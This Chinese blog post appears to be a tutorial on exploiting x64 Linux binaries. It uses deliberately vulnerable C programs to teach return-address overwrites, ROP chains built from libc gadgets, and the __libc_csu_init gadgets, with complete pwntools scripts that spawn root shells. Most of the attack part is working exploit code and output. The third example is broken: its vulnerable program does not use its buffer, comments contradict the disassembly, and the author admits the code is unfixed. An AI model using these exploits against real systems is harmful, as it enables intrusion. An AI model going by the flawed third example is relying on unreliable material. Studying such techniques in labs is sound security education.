---
layout: post
title: Linux_x64 PWN
excerpt: "64位的pwn"
categories: [未完待续]
comments: true
---
参考: http://pwn4.fun/2016/04/04/Linux-x64-PWN/
#### linux_x64与linux_x86的区别
主要两点：
1. 内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。
2. 参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在rdi, rsi, rdx, rcx, r8和r9中，如果有更多参数则保存在栈上。

拿一个简单的程序演示：
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void callsystem()
{
    system("/bin/sh");
}

void vulnerable_function()
{
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char **argv)
{
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
    return 0;
}
```
编译
```bash
gcc -fno-stack-protector vuln1.c -o vuln1
chmod +x vuln1
```

使用gdb查看vulnerable_function的指令
```bash
gdb vuln1
gdb-peda$ disass vulnerable_function
Dump of assembler code for function vulnerable_function:
   0x00000000004005cd <+0>:	push   rbp
   0x00000000004005ce <+1>:	mov    rbp,rsp
   0x00000000004005d1 <+4>:	add    rsp,0xffffffffffffff80
   0x00000000004005d5 <+8>:	lea    rax,[rbp-0x80]
   0x00000000004005d9 <+12>:	mov    edx,0x200
   0x00000000004005de <+17>:	mov    rsi,rax
   0x00000000004005e1 <+20>:	mov    edi,0x0
   0x00000000004005e6 <+25>:	call   0x4004a0 <read@plt>
   0x00000000004005eb <+30>:	leave  
   0x00000000004005ec <+31>:	ret    
End of assembler dump.
```
由`lea    rax,[rbp-0x80]`可知栈结构如下：


buf 0x80 | 
---|
rbp | 
return address | 

所以要overwrite return address为callsystem()函数的地址，需要136(**0x80+8**)个占位字节+callsystem()的地址。

查看callsystem()的地址
```shell
gdb-peda$ p &callsystem
$1 = (<text variable, no debug info> *) 0x4005bd <callsystem>
gdb-peda$ x/3i 0x4005bd
   0x4005bd <callsystem>:	push   rbp
   0x4005be <callsystem+1>:	mov    rbp,rsp
   0x4005c1 <callsystem+4>:	mov    edi,0x4006c0

```
编写exp
```python
#!/usr/bin/python
#coding:utf-8
from pwn import *

p = process('./vuln1')
callsystem = 0x4005bd
payload = "A" * 136 + p64(callsystem)
p.send(payload)
p.interactive()
```
结果
```bash
python exp.py 
[+] Starting local process './vuln1': pid 7390
[*] Switching to interactive mode
Hello, World
$ id
uid=0(root) gid=0(root) 组=0(root)

```

---

#### 使用工具寻找gadgets
x64的参数会保存在寄存器中，所以需要找一些类似于`pop rdi; ret`这样的gadget，借助工具如ROPgadget查找会更加快捷方便。

再用一个简单的例子演示：
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

void systemaddr()
{
    void *handle = dlopen("libc.so.6", RTLD_LAZY);
    printf("%p\n", dlsym(handle, "system"));
    fflush(stdout);
}

void vulnerable_function()
{
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char **argv)
{
    systemaddr();
    write(1, "Hello, World\n", 13);
    vulnerable_function();
}
```
编译：`gcc -fno-stack-protector vuln2.c -o vuln2 -ldl`

> 如果你的程序中使用dlopen、dlsym、dlclose、dlerror 显示加载动态库，需要设置链接选项 -ldl

程序会打印system()在内存中的地址，这样就不需要考虑ASLR的问题了，只要想办法执行`system("/bin/sh")`就行。需要找一个将rdi指向”/bin/sh”的gadgets：

从程序中查找指令: `ROPgadget --binary vuln2`

因为程序较小，没有`pop rdi; ret`这个gadgets。可以从libc.so中找，因为程序本身会load libc.so到内存中，并打印system()的地址，所以找到gadgets后可以通过system()计算出libc.so在内存中的基址，从而得到gadgets在内存中的实际地址。

查看调用的动态库：`ldd vuln2`
```
	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
	libdl.so.2 => /lib64/libdl.so.2 (0x00007ffff7bd7000)
	libc.so.6 => /lib64/libc.so.6 (0x00007ffff7809000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7ddb000)

```
查找libc中的`pop rdi ; ret`
```
ROPgadget --binary /lib64/libc.so.6 --only "pop|ret" | grep rdi
0x000000000001fcf0 : pop rdi ; pop rbp ; ret
0x0000000000022bf8 : pop rdi ; ret
```
我们需要构造的payload结构如下
```
payload = "\x00" * 136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
```
因为我们只需要调用一次system()函数就可以获取shell，所以可以搜索不带ret的gadgets：
```
ROPgadget --binary /lib64/libc.so.6 --only "pop|call" | grep rdi
0x000000000018f783 : call qword ptr [rbp + rdi*4]
0x0000000000184ab7 : call qword ptr [rdi]
0x00000000000266db : call rdi
0x00000000000fe889 : pop rax ; pop rdi ; call rax
0x0000000000033cfb : pop rdi ; call 0x8ff83
0x00000000000fe88a : pop rdi ; call rax
```
发现`pop rax ; pop rdi ; call rax`也可以完成目标，将rax赋值system()的地址，rdi赋值为”/bin/sh”的地址：
```
payload = "\x00" * 136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)
```
这两个ROP链都可以完成目标，随便选择一个进行攻击即可。
最终的exp:
```
#!/usr/bin/env python
from pwn import *

libc = ELF('/lib64/libc.so.6')
p = process('./vuln2')
system_addr_str = p.recvuntil('\n')
system_addr = int(system_addr_str,16)
base_addr = system_addr - libc.symbols['system']
binsh_addr = base_addr + next(libc.search('/bin/sh'))
pop_ret_addr = base_addr + 0x0000000000022bf8
p.recv()
payload = "\x00" * 136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
p.send(payload)
p.interactive()
```
结果
```
python exp.py 
[*] '/lib64/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './vuln2': pid 8620
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) 组=0(root)
```

---
#### 通用gadgets

程序在编译过程中会加入一些通用的函数来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但初始化过程是相同的，因此针对这些初始化函数，可以提取一些通用的gadgets来用。

```c
/* compile on linux_64 with gcc -o vuln3 vuln3.c */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function()
{
    char buf[128];
    read(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
}

int main(int argc, char **argv)
{
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
    return 0;
}
```
编译
```bash
gcc -o vuln3 vuln3.c
```

这个程序只有一个buffer overflow，先要想办法泄露内存信息，找到system()的值，再传递"/bin/sh"到.bss段，最后调用system("/bin/sh")。源程序中使用了write()和read()函数，可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。

在x64下有一些万能的gadgets可以使用。比如用`objdump -d vuln3`观察一下`__libc_csu_init()`这个函数。程序只要调用了libc.so，就会有这个函数对libc进行初始化。

```shell
00000000004005b0 <__libc_csu_init>:
  4005b0:       41 57                   push   %r15
  4005b2:       41 89 ff                mov    %edi,%r15d
  4005b5:       41 56                   push   %r14
  4005b7:       49 89 f6                mov    %rsi,%r14
  4005ba:       41 55                   push   %r13
  4005bc:       49 89 d5                mov    %rdx,%r13
  4005bf:       41 54                   push   %r12
  4005c1:       4c 8d 25 48 08 20 00    lea    0x200848(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
  4005c8:       55                      push   %rbp
  4005c9:       48 8d 2d 48 08 20 00    lea    0x200848(%rip),%rbp        # 600e18 <__init_array_end>
  4005d0:       53                      push   %rbx
  4005d1:       4c 29 e5                sub    %r12,%rbp
  4005d4:       31 db                   xor    %ebx,%ebx
  4005d6:       48 c1 fd 03             sar    $0x3,%rbp
  4005da:       48 83 ec 08             sub    $0x8,%rsp
  4005de:       e8 1d fe ff ff          callq  400400 <_init>
  4005e3:       48 85 ed                test   %rbp,%rbp
  4005e6:       74 1e                   je     400606 <__libc_csu_init+0x56>
  4005e8:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
  4005ef:       00 
  4005f0:       4c 89 ea                mov    %r13,%rdx
  4005f3:       4c 89 f6                mov    %r14,%rsi
  4005f6:       44 89 ff                mov    %r15d,%edi
  4005f9:       41 ff 14 dc             callq  *(%r12,%rbx,8)
  4005fd:       48 83 c3 01             add    $0x1,%rbx
  400601:       48 39 eb                cmp    %rbp,%rbx
  400604:       75 ea                   jne    4005f0 <__libc_csu_init+0x40>
  400606:       48 83 c4 08             add    $0x8,%rsp
  40060a:       5b                      pop    %rbx
  40060b:       5d                      pop    %rbp
  40060c:       41 5c                   pop    %r12
  40060e:       41 5d                   pop    %r13
  400610:       41 5e                   pop    %r14
  400612:       41 5f                   pop    %r15
  400614:       c3                      retq   
  400615:       90                      nop
  400616:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40061d:       00 00 00 

```
可以看到利用0x400606处的代码我们可以控制`rbx`, `rbp`,` r12`, `r13`, `r14`和`r15`的值，随后利用0x4005f0处的代码，可以将`r15`, `r14`,` r13`的值赋给`rdx`, `rsi`, `edi`。接着调用`call qword ptr [r12+rbx*8]`。只要将`rbx`的值设为0，再构造栈上的数据就可以控制pc去调用相关函数了。

执行完call之后，程序会对rbx+1，然后比较rbp和rbx的值，如果相等就继续执行并ret到想要继续执行的地址。为了让rbp和rbx的值相等，可以将rbp的值设为1，因为之前把rbx设为了0。

先构造payload1，利用write()输出write在内存中的地址。因为gadget是`call qword ptr [r12+rbx*8]`，所以应该使用write.got而不是write.plt的地址(got里存的是地址，plt里存的是指令)。并且为了返回原程序中，重复利用buffer overflow，我们需要再次覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。

```python
# rdi = r13, rsi = r14, rdx = r15
# write(rdi = 1, rsi = write.got, rdx = 4)
payload1 = "\x00" * 136
# pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x400606) + p64(0xdeadbeff) + p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8)
# mov rdx,r15; mov rsi,r14; mov edi,r13d; call qword ptr [r12+rbx*8]
payload1 += p64(0x4005f0)
payload1 += "\x00" * 0x38
payload1 += p64(main)
```

exp接收到write()在内存中的地址后，可以计算出system()在内存中的地址。构造payload2，利用read()将system()的地址以及”/bin/sh”写入到.bss段内存中。

```python
# read(rdi = 0, rsi = bss_addr, rdx = 16)
payload2 = "\x00" * 136
payload2 += p64(0x400606) + p64(0xdeadbeef) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)
payload2 += p64(0x4005f0)
payload2 += "\x00" * 0x38
payload2 += p64(main)
```

.bss段的地址:
```c
$ readelf -S vuln3
There are 30 section headers, starting at offset 0x1150:
Section Headers:
[Nr] Name Type Address Offset Size EntSize Flags Link Info Align
…
[25] .bss NOBITS 0000000000601028 00001028 0000000000000010 0000000000000000 WA 0 0 8
…
```

最后构造payload3，调用system()函数执行”/bin/sh”。system()的地址保存在了.bss段首地址上，”/bin/sh”的地址保存在了.bss段首地址+8字节上。

```python
#system(rdi = bss_addr+8 = "/bin/sh")
payload3 = "\x00" * 136
payload3 += p64(0x400606) + p64(0xdeadbeef) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0)
payload3 += p64(0x4005f0)
payload3 += "\x00" * 0x38
payload3 += p64(main)
```
# 代码还没改，需要重新看
最终的pwn代码
```python
#!/usr/bin/env python
from pwn import *
 
elf = ELF('vuln3')
libc = ELF('libc.so.6')
 
p = process('./vuln3')
# p = remote('127.0.0.1', 10001)
 
got_write = elf.got['write']
got_read = elf.got['read']
 
main = 0x400564
 
#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  "\x00" * 136
# pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x400606) + p64(0xdeadbeef) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) 
# mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += p64(0x4005F0) 
payload1 += "\x00" * 0x38
payload1 += p64(main)
 
p.recvuntil("Hello, World\n")
 
p.send(payload1)
 
write_addr = u64(p.recv(8))
 
base_addr = write_addr - libc.symbols['write']
system_addr = base_addr + libc.symbols['system']
 
bss_addr=0x601028
 
p.recvuntil("Hello, World\n")
 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  "\x00" * 136
payload2 += p64(0x400606) + p64(0xdeadbeef) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) 
payload2 += p64(0x4005F0) 
payload2 += "\x00" * 0x38
payload2 += p64(main)
 
p.send(payload2)
sleep(1)
 
p.send(p64(system_addr))
p.send("/bin/sh\0")
 
p.recvuntil("Hello, World\n")
 
#system(rdi = bss_addr+8 = "/bin/sh")
payload3 =  "\x00" * 136
payload3 += p64(0x400606) + p64(0xdeadbeef) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0)
payload3 += p64(0x4005F0)
payload3 += "\x00" * 0x38
payload3 += p64(main)
 
p.send(payload3)
 
p.interactive()
```